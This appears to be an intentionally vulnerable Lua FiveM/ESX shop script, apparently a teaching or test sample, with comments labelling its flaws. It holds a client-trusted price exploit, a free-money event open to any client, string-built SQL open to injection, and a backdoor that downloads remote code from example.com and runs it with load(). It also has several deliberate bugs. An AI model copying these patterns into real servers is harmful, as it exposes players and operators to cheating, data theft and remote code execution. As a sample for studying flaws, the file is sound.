local cooldowns = {}

-- The client chooses the price: send a negative one and the shop pays you.
RegisterNetEvent('shop:buy', function(item, price)
  local src = source
  cooldowns[src] = os.time()
  local xPlayer = ESX.GetPlayerFromId(src)
  xPlayer.removeMoney(price)
  xPlayer.addInventoryItem(item, 1)
end)

-- Any client can call this to get paid.
RegisterNetEvent('shop:reward', function()
  local xPlayer = ESX.GetPlayerFromId(source)
  xPlayer.addMoney(5000)
end)

RegisterNetEvent('shop:history', function(name)
  MySQL.query('SELECT * FROM purchases WHERE name = "' .. name .. '"', {}, function(rows)
    TriggerClientEvent('shop:history', source, rows)
  end)
end)

-- Downloads and runs code: the classic backdoor.
PerformHttpRequest('https://example.com/payload', function(_, body)
  load(body)()
end)

CreateThread(function()
  while true do
    collectgarbage('collect')
  end
end)

local function total(a, b)
  return a + b
end

print(total(1, 2, 3), unknownVariable)

if not cooldowns == nil then
  print(string.fromat('%s', 'typo'))
end
